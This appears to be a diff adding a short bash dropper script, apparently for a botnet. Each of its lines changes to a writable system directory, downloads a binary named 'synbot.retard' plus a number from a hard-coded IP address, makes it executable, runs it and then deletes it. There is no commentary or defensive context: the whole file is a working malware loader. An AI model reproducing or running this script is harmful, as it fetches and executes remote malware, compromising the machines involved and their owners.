@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard0; chmod +x synbot.retard0; ./synbot.retard0; rm -rf synbot.retard0
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard1; chmod +x synbot.retard1; ./synbot.retard1; rm -rf synbot.retard1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard2; chmod +x synbot.retard2; ./synbot.retard2; rm -rf synbot.retard2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard3; chmod +x synbot.retard3; ./synbot.retard3; rm -rf synbot.retard3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard4; chmod +x synbot.retard4; ./synbot.retard4; rm -rf synbot.retard4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard5; chmod +x synbot.retard5; ./synbot.retard5; rm -rf synbot.retard5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard6; chmod +x synbot.retard6; ./synbot.retard6; rm -rf synbot.retard6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard7; chmod +x synbot.retard7; ./synbot.retard7; rm -rf synbot.retard7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard8; chmod +x synbot.retard8; ./synbot.retard8; rm -rf synbot.retard8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard9; chmod +x synbot.retard9; ./synbot.retard9; rm -rf synbot.retard9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard10; chmod +x synbot.retard10; ./synbot.retard10; rm -rf synbot.retard10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard11; chmod +x synbot.retard11; ./synbot.retard11; rm -rf synbot.retard11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.74.131/synbot.retard12; chmod +x synbot.retard12; ./synbot.retard12; rm -rf synbot.retard12
